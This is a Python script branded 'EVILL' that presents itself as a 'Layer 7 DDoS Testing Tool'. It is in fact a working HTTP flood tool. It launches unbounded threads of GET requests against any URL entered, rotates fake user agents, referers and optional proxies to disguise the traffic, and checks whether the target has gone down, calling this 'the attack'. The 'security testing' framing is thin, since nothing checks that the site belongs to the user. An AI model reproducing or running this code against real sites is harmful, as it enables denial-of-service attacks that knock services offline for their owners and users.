import requests
import threading
import random
import time
from urllib.parse import urljoin
from fake_useragent import UserAgent
import keyboard
from colorama import Fore, Style

# Text Logo
def print_logo():
    print(Fore.RED + Style.BRIGHT + """
    ███████╗██╗   ██╗██╗██╗     ██╗     
    ██╔════╝██║   ██║██║██║     ██║     
    █████╗  ██║   ██║██║██║     ██║     
    ██╔══╝  ██║   ██║██║██║     ██║     
    ██║     ╚██████╔╝██║███████╗███████╗
    ╚═╝      ╚═════╝ ╚═╝╚══════╝╚══════╝
    """ + Fore.BLACK + Style.BRIGHT + """
              Advanced Testing Tool
             Creator: By EVILL
    """ + Style.RESET_ALL)

# User input setup
def user_input():
    print_logo()
    print("\nWelcome to EVILL - Layer 7 DDoS Testing Tool for Your Website Security!\n")
    target_url = input("Enter your website URL (e.g., https://yourwebsite.com): ")
    num_threads = int(input("Enter the number of threads: "))
    test_duration = int(input("Enter the test duration in seconds: "))
    return target_url, num_threads, test_duration

# Set up a user agent generator
ua = UserAgent()

# User input
TARGET_URL, NUM_THREADS, TEST_DURATION = user_input()
PROXY_LIST = []  # Add a list of proxies here if you want to use proxies (optional)

# Headers and user agent
USER_AGENTS = [ua.random for _ in range(10)]  # Get random user agents
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.wikipedia.org/",
    "https://www.reddit.com/"
]

# Random data for POST requests (you can expand this to match your forms)
POST_DATA = {
    "username": "testuser",
    "password": "password123"
}

# Global stop flag
stop_flag = False

# Function to stop the script
def check_for_stop():
    global stop_flag
    while not stop_flag:
        if keyboard.is_pressed('ctrl+x'):
            print(Fore.YELLOW + "\n[INFO] Detected Ctrl+X. Stopping the tool..." + Style.RESET_ALL)
            stop_flag = True
            break

# Check if the website is reachable
def check_website_status():
    try:
        response = requests.get(TARGET_URL, timeout=5)
        if response.status_code == 200:
            print(Fore.RED + f"[INFO] Website is UP: {TARGET_URL}\n" + Style.RESET_ALL)
            return True
        else:
            print(Fore.GREEN + f"[INFO] Website returned status code {response.status_code}. Exiting...\n" + Style.RESET_ALL)
            return False
    except Exception as e:
        print(Fore.GREEN + f"[INFO] Website is DOWN or unreachable. Details: {e}\n" + Style.RESET_ALL)
        return False

# Function to simulate GET request
def send_get_request():
    global stop_flag
    while not stop_flag:
        try:
            url = urljoin(TARGET_URL, "/page") + f"?param={random.randint(1, 1000)}"
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else {}
            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
            print(f"GET Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with GET request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to simulate POST request
def send_post_request():
    global stop_flag
    while not stop_flag:
        try:
            url = urljoin(TARGET_URL, "/submit_form")
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else {}
            response = requests.post(url, data=POST_DATA, headers=headers, proxies=proxies, timeout=5)
            print(f"POST Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with POST request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to handle concurrent requests
def start_attack():
    global stop_flag
    print("\n[INFO] Starting the simulation...")
    start_time = time.time()

    # Check website status
    if not check_website_status():
        print(Fore.GREEN + "[INFO] Exiting. Ensure the target website is reachable.\n" + Style.RESET_ALL)
        return

    # Start a thread to monitor for Ctrl+X keypress
    stop_thread = threading.Thread(target=check_for_stop)
    stop_thread.daemon = True
    stop_thread.start()

    # Start threads for various types of requests
    while time.time() - start_time < TEST_DURATION and not stop_flag:
        if not check_website_status():
            print(Fore.GREEN + "\n[INFO] Target website is DOWN. Stopping the attack...\n" + Style.RESET_ALL)
            break

        thread = threading.Thread(target=send_get_request)
        thread.daemon = True
        thread.start()

    print(Fore.YELLOW + "\n[INFO] Test completed or stopped by user." + Style.RESET_ALL)

# Main function to start testing
if __name__ == "__main__":
    print(Fore.BLACK + Style.BRIGHT + f"\nTarget: {TARGET_URL}" + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + f"Threads: {NUM_THREADS}" + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + f"Duration: {TEST_DURATION} seconds\n" + Style.RESET_ALL)
    start_attack()